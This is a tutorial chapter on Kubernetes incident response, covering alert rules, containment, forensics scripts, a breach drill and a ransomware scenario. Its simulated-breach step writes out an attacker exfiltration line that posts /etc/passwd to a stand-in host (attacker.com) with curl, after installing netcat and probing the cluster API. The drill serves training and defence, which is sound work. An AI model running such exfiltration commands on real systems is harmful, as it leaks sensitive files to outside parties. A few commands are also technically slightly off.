# Incident Response

## Overview

**Incident Response** is the process of detecting, containing, and recovering from security breaches. It includes forensics, playbooks, communication, and post-incident analysis.

## Mental Model

```
Incident Response Timeline:

BEFORE: Prevention
  └─ Secure systems, monitoring, alerting
     (Goal: 0 incidents, but realistic: some will happen)

INCIDENT DETECTION:
  └─ Alert fires: Suspicious activity detected
     (Minutes to hours after attack starts)
     
RESPONSE PHASES:

1. DETECT (Seconds to Minutes)
   └─ Alert fires
   └─ Alert is real (not false positive)
   └─ Incident is confirmed
   Goal: Minimize detection time (faster = less damage)

2. CONTAIN (Minutes to Hours)
   └─ Isolate compromised system
   └─ Prevent attacker from spreading
   └─ Preserve evidence
   Goal: Stop attacker from stealing data
   
3. RECOVER (Hours to Days)
   └─ Patch vulnerabilities
   └─ Rebuild systems
   └─ Restore from backup
   Goal: Get system back online safely

4. INVESTIGATE (Days to Weeks)
   └─ Determine what happened
   └─ Find how attacker got in
   └─ Understand what data was accessed
   Goal: Prevent same attack in future

5. COMMUNICATE (Throughout)
   └─ Internal: Teams, executives, legal
   └─ External: Users, regulators, media
   Goal: Manage reputation, meet legal requirements

6. LESSONS LEARNED (After incident)
   └─ What could we have prevented?
   └─ What could we have detected faster?
   └─ What worked well?
   Goal: Improve systems and processes

Cost of slow response:
  - Detected after 1 hour:   $10K damage
  - Detected after 6 hours:  $100K damage
  - Detected after 24 hours: $1M+ damage
  
Result: Fast detection saves money and reputation
```

## Incident Detection

### Alerting Rules

```yaml
# Prometheus alert rules for security
groups:
- name: security_alerts
  rules:
  # Suspicious pod creation
  - alert: SuspiciousPrivilegedPod
    expr: |
      increase(kubernetes_pods_created_with_privileged[5m]) > 0
    annotations:
      summary: "Privileged pod created"
      description: "Pod {{ $labels.pod }} created with privileged: true"
    
  # Unauthorized API access
  - alert: UnauthorizedAPIAccess
    expr: |
      increase(apiserver_audit_event_total{verb="delete",resource="secrets"}[5m]) > 0
    annotations:
      summary: "Unauthorized secret deletion"
      description: "User {{ $labels.user }} deleted secrets"
    
  # Unusual network traffic
  - alert: SuspiciousEgressTraffic
    expr: |
      rate(network_bytes_out[5m]) > 1000000000  # > 1GB/s
    annotations:
      summary: "Unusual outbound traffic"
      description: "Pod exfiltrating data?"
    
  # Crypto mining (high CPU)
  - alert: CryptoMiningDetected
    expr: |
      rate(container_cpu_usage_seconds_total[5m]) > 0.8 and
      container_memory_working_set_bytes > 2000000000
    annotations:
      summary: "Possible crypto mining"
      description: "High CPU/memory, typical of mining"
    
  # Brute force attempts
  - alert: BruteForceAttempt
    expr: |
      rate(failed_login_attempts[5m]) > 10
    annotations:
      summary: "Brute force detected"
      description: "{{ $value }} failed logins in 5 minutes"
```

### ELK Stack for Log Analysis

```yaml
# Deploy ELK (Elasticsearch, Logstash, Kibana)
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: elasticsearch
spec:
  serviceName: elasticsearch
  replicas: 3
  selector:
    matchLabels:
      app: elasticsearch
  template:
    metadata:
      labels:
        app: elasticsearch
    spec:
      containers:
      - name: elasticsearch
        image: docker.elastic.co/elasticsearch/elasticsearch:7.17.0
        env:
        - name: discovery.type
          value: zen
        - name: ES_JAVA_OPTS
          value: "-Xms2g -Xmx2g"

---
# Logstash for log collection and parsing
apiVersion: v1
kind: ConfigMap
metadata:
  name: logstash-config
data:
  logstash.conf: |
    input {
      kubernetes {
        kubernetes_namespace => "kube-system"
      }
    }
    filter {
      if [kubernetes][pod][name] =~ /suspicious/ {
        mutate {
          add_field => { "alert_level" => "high" }
        }
      }
    }
    output {
      elasticsearch {
        hosts => ["elasticsearch:9200"]
        index => "logs-%{+YYYY.MM.dd}"
      }
    }

---
# Kibana dashboard
apiVersion: apps/v1
kind: Deployment
metadata:
  name: kibana
spec:
  replicas: 1
  template:
    metadata:
      labels:
        app: kibana
    spec:
      containers:
      - name: kibana
        image: docker.elastic.co/kibana/kibana:7.17.0
        env:
        - name: ELASTICSEARCH_HOSTS
          value: "http://elasticsearch:9200"
        ports:
        - containerPort: 5601
```

## Incident Containment

### Isolate Compromised System

```bash
# Detected: Pod making unauthorized API calls

# 1. IMMEDIATE: Kill the pod (prevent further damage)
kubectl delete pod suspicious-pod-abc --grace-period=0

# 2. Preserve evidence (logs, memory dump) BEFORE killing
kubectl logs suspicious-pod-abc > /tmp/evidence-logs.txt
kubectl describe pod suspicious-pod-abc > /tmp/evidence-pod.txt

# 3. Network isolation: Block all egress
kubectl apply -f - << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: isolate-compromised-namespace
spec:
  podSelector:
    matchLabels:
      app: compromised-app
  policyTypes:
  - Egress
  # No egress rules = no outbound traffic
  egress: []
EOF

# 4. Prevent pod from restarting (if stateful)
kubectl patch deployment compromised-app -p '{"spec":{"replicas":0}}'

# 5. Quarantine: Keep pod for forensics (don't delete yet)
kubectl label pod forensics-pod-abc quarantine=true
```

### Contain Lateral Movement

```bash
# Attacker compromised Pod A, may try to reach Pod B

# 1. Review network access from compromised pod
kubectl logs -l app=compromised-app -c istio-proxy | \
  grep "upstream_host" | \
  sort | uniq  # Which services did it try to access?

# 2. Block access to sensitive services
kubectl apply -f - << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: protect-database
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: api
    # Only allow from known-good pod (api)
    # Block from compromised pod
EOF

# 3. Rotate secrets that compromised pod could access
# If pod had access to db-password secret:
kubectl delete secret db-password
kubectl create secret generic db-password --from-literal=password=$(openssl rand -base64 32)

# Update all pods using this secret (trigger rollout)
kubectl rollout restart deployment api
```

## Incident Investigation

### Forensics Playbook

```bash
#!/bin/bash
# Incident forensics script

INCIDENT_ID=$1
COMPROMISED_POD=$2

mkdir -p /tmp/forensics/$INCIDENT_ID

# 1. Collect pod logs
echo "[*] Collecting pod logs..."
kubectl logs $COMPROMISED_POD --all-containers=true --timestamps=true \
  > /tmp/forensics/$INCIDENT_ID/pod-logs.txt

# 2. Collect pod events
echo "[*] Collecting pod events..."
kubectl describe pod $COMPROMISED_POD \
  > /tmp/forensics/$INCIDENT_ID/pod-events.txt

# 3. Collect audit logs (who accessed this pod?)
echo "[*] Collecting audit logs..."
kubectl logs -n kube-system -l component=kube-apiserver | \
  grep $COMPROMISED_POD > /tmp/forensics/$INCIDENT_ID/audit-logs.txt

# 4. Collect network traffic (what did pod connect to?)
echo "[*] Analyzing network connections..."
kubectl exec $COMPROMISED_POD -- netstat -tuln > /tmp/forensics/$INCIDENT_ID/network-connections.txt

# 5. Collect environment variables (what secrets did pod have?)
echo "[*] Collecting environment..."
kubectl exec $COMPROMISED_POD -- env > /tmp/forensics/$INCIDENT_ID/environment.txt

# 6. Timeline of events
echo "[*] Creating timeline..."
grep timestamp /tmp/forensics/$INCIDENT_ID/*.txt | \
  sort | uniq > /tmp/forensics/$INCIDENT_ID/timeline.txt

echo "[+] Forensics complete: /tmp/forensics/$INCIDENT_ID/"
```

### Determine Attack Vector

```bash
# Question: How did attacker compromise this pod?

# Option 1: Vulnerable application
grep -i "error\|exception\|traceback" /tmp/forensics/$INCIDENT_ID/pod-logs.txt
# Look for stack traces, SQL injection attempts, etc

# Option 2: Supply chain (container image)
kubectl get pod $COMPROMISED_POD -o jsonpath='{.spec.containers[0].image}'
# Check if image signature was verified
# Check image scan results
# Check base image for vulnerabilities

# Option 3: Configuration vulnerability
kubectl describe pod $COMPROMISED_POD | grep -A5 "securityContext"
# Was pod running as root?
# Did pod have privilege escalation?

# Option 4: Lateral movement (already compromised)
grep "mount\|volume" /tmp/forensics/$INCIDENT_ID/pod-events.txt
# Did pod mount host filesystem?
# Did pod mount service account token?

# Option 5: External exploitation (misconfigured network)
kubectl get ingress | grep "$(kubectl describe pod $COMPROMISED_POD | grep 'Status:' -A5 | grep 'IP')"
# Was pod exposed to internet?
# Should port be open?
```

## Hands-On: Incident Response Drill

### Step 1: Simulate Breach

```bash
# Deploy vulnerable app
kubectl apply -f - << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-app
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vulnerable
  template:
    metadata:
      labels:
        app: vulnerable
    spec:
      containers:
      - name: app
        image: ubuntu:22.04
        command: ["/bin/sleep", "3600"]
        
---
apiVersion: v1
kind: Service
metadata:
  name: vulnerable-app-service
spec:
  selector:
    app: vulnerable
  ports:
  - port: 8080
    targetPort: 8080
EOF

# Simulate attacker getting into pod
kubectl exec -it deployment/vulnerable-app -- /bin/bash

# Inside pod:
# 1. Install tools
apt-get update
apt-get install -y curl wget netcat-openbsd

# 2. Try lateral movement
curl http://kubernetes.default/api/v1/namespaces
# Try to access Kubernetes API

curl http://other-service:8080
# Try to reach other service

# 3. Exfiltrate data
curl -X POST http://attacker.com/data -d "$(cat /etc/passwd)"
# Try to send data to attacker
```

### Step 2: Detect Incident

```bash
# Alert should fire for:
# - Unauthorized API access
# - Unusual outbound connections
# - Multiple failed auth attempts

# View alerts
kubectl logs -n prometheus -l app=prometheus | grep -i alert

# Check metrics
# CPU spike? Memory spike? Network traffic spike?
```

### Step 3: Contain Incident

```bash
# Run containment steps
# 1. Kill pod
kubectl delete deployment vulnerable-app

# 2. Preserve evidence
mkdir -p /tmp/incident-evidence
kubectl logs deployment/vulnerable-app > /tmp/incident-evidence/logs.txt

# 3. Block network
kubectl apply -f - << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all-egress
spec:
  podSelector: {}
  policyTypes:
  - Egress
  # No rules = block all egress
EOF

# 4. Rotate compromised secrets
kubectl delete secret all-secrets
```

### Step 4: Investigate

```bash
# Run forensics
bash /tmp/forensics-playbook.sh incident-20240106 vulnerable-app-xxx

# Analyze evidence
cat /tmp/forensics/incident-20240106/timeline.txt
cat /tmp/forensics/incident-20240106/network-connections.txt

# Timeline shows:
# - 2024-01-06 14:00:00: Pod created
# - 2024-01-06 14:05:00: First API request to kubernetes.default
# - 2024-01-06 14:10:00: curl to external IP
# - 2024-01-06 14:15:00: Alert fired

# Determine: Attack occurred minutes 5-10, detected at minute 15
```

## Common Mistakes

**Mistake 1: No incident response plan**
```bash
# ❌ WRONG:
# Incident happens
# Everyone runs around confused
# Different people doing different things
# Evidence destroyed, communication fails
# Recovery takes days

# ✅ RIGHT:
# Incident happens
# Runbook provides steps
# Clear roles (who detects, who contains, who communicates)
# Evidence preservation first
# Recovery takes hours
```

**Mistake 2: Destroying evidence**
```bash
# ❌ WRONG:
# Incident detected
# Immediately delete suspicious pod
# Delete logs
# No evidence left to investigate

# ✅ RIGHT:
# 1. Collect logs/memory BEFORE deletion
# 2. Preserve pod for analysis
# 3. Keep audit trail of all containment actions
# 4. Enable forensic analysis after containment
```

**Mistake 3: Incident response without communication plan**
```bash
# ❌ WRONG:
# Data breach occurs
# Team doesn't know who to notify
# Hours pass before executives know
# Regulatory notification deadline missed

# ✅ RIGHT:
# Incident response plan includes:
# - Who to notify (chain of command)
# - When to notify (immediate for critical)
# - What to say (facts, not speculation)
# - Escalation matrix (CRITICAL → CEO, CFO, legal)
```

**Mistake 4: Slow detection**
```bash
# ❌ WRONG:
# Attacker in system for 90 days before detection
# Called "dwell time"
# By then: Attacker has stolen data, covered tracks

# ✅ RIGHT:
# 1. Real-time alerting (seconds to detect)
# 2. Threat intelligence (known attack patterns)
# 3. Behavioral analysis (unusual=suspicious)
# 4. Goal: Detect within minutes, not days
```

**Mistake 5: Post-incident blame instead of improvement**
```bash
# ❌ WRONG:
# After incident: "Who's to blame?"
# People get defensive, don't report issues
# Same vulnerability causes future breach

# ✅ RIGHT:
# After incident: "What can we improve?"
# Blameless post-mortems
# Focus on systems/processes, not people
# Questions:
#  - Could we have detected faster?
#  - Could we have prevented this?
#  - What alerts were missing?
# Result: Better security for next time
```

## Production Incident Scenario

### Scenario: "Ransomware deployed, data encrypted, attacker demands payment"

**Timeline:**

```
2024-01-06 09:00:00
  └─ Attacker compromises developer laptop via phishing
  
2024-01-06 10:30:00
  └─ Attacker uses developer creds to access Kubernetes cluster
  
2024-01-06 11:00:00
  └─ Attacker deploys pod with ransomware image
  
2024-01-06 12:00:00
  └─ Ransomware pod starts encrypting files
  
2024-01-06 14:30:00  ← DETECTION
  └─ Alert fires: "High disk I/O, possible encryption"
  
2024-01-06 14:35:00  ← CONTAINMENT
  └─ Pod deleted, network isolated
  
2024-01-06 14:45:00  ← INVESTIGATION
  └─ Root cause: Developer credentials compromised
```

**Response Actions:**

```bash
# 1. DETECT & CONFIRM (5 minutes)
# Alert: "High disk I/O on data volume"
# Confirmation: "Database files becoming .locked files"

# 2. CONTAIN (10 minutes)
# Immediately kill ransomware pod
kubectl delete pod ransomware-xxx --grace-period=0

# Isolate all pod network access
kubectl apply -f - << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: incident-lockdown
spec:
  podSelector: {}
  policyTypes:
  - Egress
  # No egress allowed
EOF

# 3. PRESERVE EVIDENCE (immediately)
# Snapshot database
kubectl exec database-pod -- pg_dump > /tmp/backup-incident.sql

# Get pod logs
kubectl logs ransomware-pod > /tmp/ransomware-logs.txt

# 4. COMMUNICATE (immediately)
# CEO: "Data encrypted by ransomware, 2.5 TB affected"
# Legal: "Notify customers within regulatory deadline"
# Ops: "Restore from backup"

# 5. RECOVER (hours)
# Restore database from backup
kubectl delete pvc database-data
kubectl create pvc from-backup database-data

# Restore from backup (assuming hourly backups)
# Data loss: ~1 hour of transactions

# 6. INVESTIGATE (days)
# How were developer creds compromised?
# Was ransomware in supply chain or deployment?
# Did attacker access other systems?

# Check developer account activity
kubectl logs -l component=audit | grep "user=developer@company.com"

# Find: Attacker used creds at 10:30 AM from IP 201.23.45.67
# That IP is in Pakistan, developer is in US
# → Clear sign of compromise
```

**Lessons Learned:**

```
What went wrong?
  1. No MFA on developer account
  2. No network segmentation (all pods could touch all volumes)
  3. Slow detection (2.5 hours from infection to alert)
  4. No immutable backups (all backups encrypted too)

Improvements:
  1. Enforce MFA for all developers
  2. Network policies: Pods can't access random volumes
  3. Alert on file encryption patterns (faster detection)
  4. Immutable backups: Off-site, read-only copies
  5. Weekly restore drills: Know recovery time
```

## Practice Questions

1. **Scenario:** You detect ransomware encrypting database. First action?
   - Answer: Kill the pod (stop encryption immediately). Then: Preserve logs. Isolate network. Restore from backup.

2. **Question:** Should you pay ransom?
   - Answer: No. FBI/law enforcement recommend against it. Payment funds attackers, no guarantee of decryption. Instead: Restore from backup.

3. **Decision:** Incident happens at 11 PM. Who do you call?
   - Answer: On-call security engineer immediately. Then: Chain of command (manager, director, CEO if critical). Don't wait for business hours.

4. **Comparison:** RPO vs RTO?
   - RPO (Recovery Point Objective): How much data loss acceptable? (e.g., 1 hour = acceptable to lose 1 hour of data)
   - RTO (Recovery Time Objective): How long acceptable to be down? (e.g., 4 hours = must restore within 4 hours)
   Both should guide backup strategy.

## Further Reading

- [NIST Incident Response Guide](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)
- [FBI Ransomware Prevention](https://www.fbi.gov/news/testimony/ransomware-and-the-attack-on-colonial-pipeline)
- [Kubernetes Forensics](https://kubernetes.io/docs/tasks/debug-application-cluster/)
- [Incident Response Playbooks](https://www.incidentresponseplaybooks.com/)
- [ELK Stack Documentation](https://www.elastic.co/what-is/elk-stack)

---

**Congratulations!** You've completed the Security Essentials track:
- ✅ Application Security (prevent vulns in code)
- ✅ Infrastructure Security (defend deployed systems)
- ✅ Supply Chain Security (secure the build pipeline)
- ✅ Compliance & Audit (meet regulatory requirements)
- ✅ Incident Response (detect & contain breaches)

You now have a comprehensive understanding of security in DevOps. Security is a continuous journey—keep learning and stay vigilant!
